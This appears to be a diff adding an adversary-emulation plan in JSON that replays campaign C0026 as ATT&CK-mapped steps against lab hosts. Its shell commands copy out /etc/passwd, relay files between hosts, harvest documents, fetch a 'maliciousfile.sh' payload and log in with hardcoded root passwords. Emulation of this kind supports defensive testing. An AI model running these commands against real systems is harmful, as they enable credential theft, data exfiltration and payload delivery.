@@ -1,0 +1,107 @@
+[
+  {
+    "ability_id": "ef6472a9-c101-5bd6-9301-0d6bd51597b5",
+    "name": "T1030 - Data Transfer Size Limits",
+    "tactic": "exfiltration",
+    "technique_name": "Data Transfer Size Limits",
+    "technique_id": "T1030",
+    "description": "During C0026, the threat actors split encrypted archives containing stolen files and information into 3MB parts prior to exfiltration.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@172.21.0.20 'split -b 3M /etc/passwd /tmp/passwd.part.' && sshpass -p RootPass123 scp -o StrictHostKeyChecking=no root@172.21.0.20:/tmp/passwd.part.* ./ && sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@172.21.0.20 'cat /tmp/passwd.part.* | sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@172.22.0.20 \"cat > /tmp/passwd_reassembled\"'"
+      }
+    ]
+  },
+  {
+    "ability_id": "e517b4ad-9ece-5800-b438-e3ca5f8ae68d",
+    "name": "T1568 - Dynamic Resolution",
+    "tactic": "command-and-control",
+    "technique_name": "Dynamic Resolution",
+    "technique_id": "T1568",
+    "description": "During C0026, the threat actors re-registered a ClouDNS dynamic DNS subdomain which was previously used by ANDROMEDA.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "host hostb.dynamic.local 172.21.0.20 && dig @172.21.0.20 hostb.dynamic.local A && nc -vz 172.21.0.20 53"
+      }
+    ]
+  },
+  {
+    "ability_id": "e21dab0a-0576-5303-9980-f5be46ee99ad",
+    "name": "T1560.001 - Archive via Utility",
+    "tactic": "collection",
+    "technique_name": "Archive via Utility",
+    "technique_id": "T1560.001",
+    "description": "During C0026, the threat actors used WinRAR to collect documents on targeted systems. The threat actors appeared to only exfiltrate files created after January 1, 2021.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "sshpass -p Passw0rd ssh attacker@172.21.0.20 'find /home/attacker -type f -newermt 2021-01-01 ! -name archive.zip -exec zip /tmp/archive.zip {} +' && sshpass -p Passw0rd scp attacker@172.21.0.20:/tmp/archive.zip ./archive.zip"
+      }
+    ]
+  },
+  {
+    "ability_id": "6ca6d390-31f7-5863-9ecc-0dc13c43e57b",
+    "name": "T1583.001 - Domains",
+    "tactic": "resource-development",
+    "technique_name": "Domains",
+    "technique_id": "T1583.001",
+    "description": "For C0026, the threat actors re-registered expired C2 domains previously used for ANDROMEDA malware.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "dig @172.21.0.20 malicious.example A +noall +answer"
+      }
+    ]
+  },
+  {
+    "ability_id": "5ddb8518-3a39-51b5-857f-982be5748f77",
+    "name": "T1105 - Ingress Tool Transfer",
+    "tactic": "command-and-control",
+    "technique_name": "Ingress Tool Transfer",
+    "technique_id": "T1105",
+    "description": "During C0026, the threat actors downloaded malicious payloads onto select compromised hosts.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "sshpass -p RootPass123 scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null /usr/bin/wget root@172.21.0.20:/tmp/wget && sshpass -p RootPass123  ssh -o StrictHostKeyChecking=no root@172.21.0.20 'wget http://172.21.0.20/maliciousfile.sh -O /tmp/malware && sshpass -p RootPass123  scp -o StrictHostKeyChecking=no /tmp/malware root@172.22.0.20:/tmp/malware'"
+      }
+    ]
+  },
+  {
+    "ability_id": "260eff19-ecfa-5407-81a8-9a2eb8cb0ead",
+    "name": "T1005 - Data from Local System",
+    "tactic": "collection",
+    "technique_name": "Data from Local System",
+    "technique_id": "T1005",
+    "description": "During C0026, the threat actors collected documents from compromised hosts.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "sshpass -p 'Passw0rd' ssh -o StrictHostKeyChecking=no attacker@172.21.0.20 'find /home/attacker -type f -name \"*.doc\" -o -name \"*.docx\" -o -name \"*.pdf\" -o -name \"*.txt\" -exec cat {} +'"
+      }
+    ]
+  },
+  {
+    "ability_id": "260eff19-ecfa-5407-81a8-roth",
+    "name": "END OF EMULATION",
+    "tactic": "impact",
+    "technique_name": "System Shutdown",
+    "technique_id": "T1529",
+    "description": "This is the end.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "echo \"END OF C0026\""
+      }
+    ]
+  }  
+]
